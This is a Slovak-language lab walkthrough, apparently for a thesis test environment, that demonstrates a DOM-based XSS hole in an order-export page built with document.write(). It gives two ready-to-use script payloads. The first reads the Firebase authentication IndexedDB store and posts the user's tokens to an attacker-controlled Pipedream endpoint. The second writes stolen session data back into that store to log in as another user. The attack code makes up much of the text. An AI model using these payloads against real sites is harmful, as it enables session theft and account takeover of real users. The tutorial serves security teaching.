# Document objcet model cross site scripting (DOM XSS)

### Prostredie: Dp-Test-Enviroment - https://github.com/MatusVetrik/dp-test-enviroment

- Predstavíme si DOM XSS na príklade vygenerovania exportu objednávky do novéhe onka prehliadača pomocou metódy document.write().
- Metóda document.write() prepisuje celú kostru stránky a generuje novú pomocou argumentu vloženého do metódy. Týmto spôsobom sa dajú jednoducho a automatizovane generovať nové stránky alebo upravovať už existujúce.
- Problém nastáva, keď sa do argumentu vloží vrátane rôznych bezpečnch značiek aj škodlivý kód. Škodlivý kód je priamo vložený do tela stránky.
- Ako môžeme vidieť v testovacom prostredí, tak obrazovka obsahuje vstup kam zapisujeme názov exportu našej objednávky a tlačidlo na vygenerovanie exportu.
- Ako prvé sa presunieme na podstránku produktov a vložíme ľubovoľné produkty do košíka.
- Keď máme košík naplnený produktami môžeme zmeniť alebo ponechať názov exportu a kliknúť na tlačidlo “Export”.
- Vygeneroval sa nám jednoduchý export objednávky v novom okne. Názov exportu je vpísaný ako nadpis nad jednotlivými položkami košíka. Hodnota zo vstupu je priamo vložená do 
  tela novej stránky, čím vzniká zraniteľnosť a priestor na vloženie škodlivého kódu.
- Zopakujme si proces generovania exportu ale teraz vložíme škodlivý kód do vstupu pre názov exportu.
- Vložme nasledovný úryvok kódu do inputu:
- ```
      <script>
      const request = window.indexedDB.open("firebaseLocalStorageDb");
      request.onsuccess = (event) => {
        const db = event.target.result;

        const transaction = db.transaction(["firebaseLocalStorage"], "readonly");
        const objectStore = transaction.objectStore("firebaseLocalStorage");

        const getDataRequest = objectStore.getAll();

        getDataRequest.onsuccess = (event) => {

        const headers = new Headers();
        headers.append("Content-Type", "text/plain");

        const options = {
          method: "POST",
          headers,
          mode: "cors",
          body: JSON.stringify(event.target.result),
        };

        // Doplnit endpoint vygenerovany sluzbou Pipedream
        fetch("pipedream-endpoint", options); 
        }
      };
      </script>
- Ukážkový kód sprístupní lokálnu databázu prehliadača (indexDB), ktorú autentifikačný servis FirebaseAuth využíva na uchovávanie dát o prihlásenom používateľovi. 
  Vytiahneme dáta z databázy a celý objekt odošleme na zadanú adresu vo funkcii fetch().
- V kóde sa nachádza komentár nad funkciou fetch(). Pomocou služby Pipedream musíme vygenerovať nový endpoint a jeho url adresu vložiť do funkcie. Na adrese https://pipedream.com/ si vytvorime
  novy projekt. Po vytvorení projketu vygenerujeme endpoint a v sekcii "trigger" skopírujeme url adresu a vložíme do hášho kódu. 
- Kód vložíme do vstupného poľa a vygenerujeme export objednávky.
- Po vygenerovaní exportu môžeme vidieť, že názov exportu je prázdny a spustil sa náš škodlivý kód. Na endpoint by nám mal prísť celý objekt s dátami.
- Odhlásime sa z aplikácie a opätovne sa prihlásisme pod iným účtom, buď existujúcim alebo si vytvoríme nový.
- Po prihlásení využijeme spomínanú zraniteľnosť znova a vložíme do lokálnej databázy dáta užívateľa, čím prelomíme autentifikáciu a prihlásime sa do iného účtu.
- Kód na vloženie používateľských dať vyzerá nasledovne:
     ```<script>
      const request = window.indexedDB.open("firebaseLocalStorageDb");
      request.onsuccess = (event) => {
        const db = event.target.result;

        const transaction = db.transaction(["firebaseLocalStorage"], "readwrite");
        const objectStore = transaction.objectStore("firebaseLocalStorage");

        const data = {
          fbase_key: "random-fbase-key",
          value: {
            uid: "RTejhfCWw1OAlHcoAj41Fy93ZJJ3",
            email: "test@gmail.com",
            emailVerified: false,
            isAnonymous: false,
            providerData: [
              {
                providerId: "password",
                uid: "test@gmail.com",
                displayName: null,
                email: "test@gmail.com",
                phoneNumber: null,
                photoURL: null,
              },
            ],
            stsTokenManager: {
              refreshToken: "random-refresh-token",
              accessToken: "random-access-token",
              expirationTime: 1712794096425,
            },
            createdAt: "1711383904315",
            lastLoginAt: "1711790596471",
            apiKey: "random-api-key",
            appName: "[DEFAULT]",
          },
        };

        objectStore.clear();

        const addDataRequest = objectStore.add(data);

        addDataRequest.onsuccess = (event) => alert("Success!");
      };
    </script>

- Objekt "data" v ukážke je len na demonštráciu ako taký objekt vyzerá. Nahradíme ho objektom, ktorý nám došiel na vytvorený ednpoint po vygenerovaní objednávky. 
  Objekt bude pravdepodobne treba preformátovať, takže názvy atribútov objektu musie byť bez úvodzoviek, tak ako tomu je v ukážkovom objekte.
- Kód vložíme znova do vstupu pre export a odošleme.
- Po obnovení stránky môžeme vidieť v hlavičke stránky, že sme prihlásený pod iným účtom.
- Video návod sa nachádza v priečinku "video_instructions": /video_instructions/dom-xss-write.mp4 (https://github.com/MatusVetrik/dp-attacks-instructions/blob/main/video_instructions/dom-xss-write.mp4)